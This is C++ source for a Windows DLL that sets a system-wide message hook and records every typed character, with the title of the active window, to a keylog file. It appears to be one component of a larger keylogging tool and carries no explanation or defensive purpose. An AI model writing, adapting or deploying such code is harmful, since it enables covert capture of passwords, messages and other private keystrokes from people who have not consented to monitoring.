#include "lgdll.h"

LRESULT CALLBACK KeyboardProc(INT code, WPARAM wParam, LPARAM lParam);

#pragma data_seg(".SHARDAT")
HHOOK hHook;
HWND hWnd = NULL;
#pragma data_seg()
#pragma comment(linker, "/section:.SHARDAT,RWS")

HANDLE hModule;

VOID DECLSPEC InstallHook(VOID){
	hHook = SetWindowsHookEx(WH_GETMESSAGE, KeyboardProc, (HINSTANCE)hModule, 0);
}

VOID DECLSPEC RemoveHook(VOID){
	UnhookWindowsHookEx(hHook);
}

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){
	if(ul_reason_for_call == DLL_PROCESS_ATTACH){
		::hModule = hModule;
	}else if(ul_reason_for_call == DLL_PROCESS_DETACH){

	}
    return TRUE;
}

LRESULT CALLBACK KeyboardProc(INT nCode, WPARAM wParam, LPARAM lParam){
    if (nCode < 0)
        return CallNextHookEx(hHook, nCode, wParam, lParam);

	if(nCode == HC_ACTION && wParam == PM_REMOVE){
		MSG *Msg = (MSG *)lParam;
		if(LOWORD(Msg->message) == WM_CHAR){
			File LogFile(Config::GetKeylogFilename());
			DWORD BytesWritten;
			CHAR Buf[64];
			if(hWnd != GetForegroundWindow()){
				hWnd = GetForegroundWindow();
				strcpy(Buf, "\r\n\r\n[");
				GetWindowText(hWnd, Buf + 5, sizeof(Buf) - 10);
				strcat(Buf, "]\r\n");
				LogFile.GoToEOF();
				LogFile.Write((PBYTE)Buf, strlen(Buf), &BytesWritten);
			}
			switch(Msg->wParam){
				case VK_RETURN:
					Buf[0] = '\r';
					Buf[1] = '\n';
					Buf[2] = NULL;
				break;
				case VK_BACK:
					Buf[0] = '<';
					Buf[1] = NULL;
				break;
				default:
					Buf[0] = Msg->wParam;
					Buf[1] = NULL;
				break;
			}
			LogFile.GoToEOF();
			LogFile.Write((PBYTE)Buf, strlen(Buf), &BytesWritten);
			LogFile.Close();
		}
	}
	
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}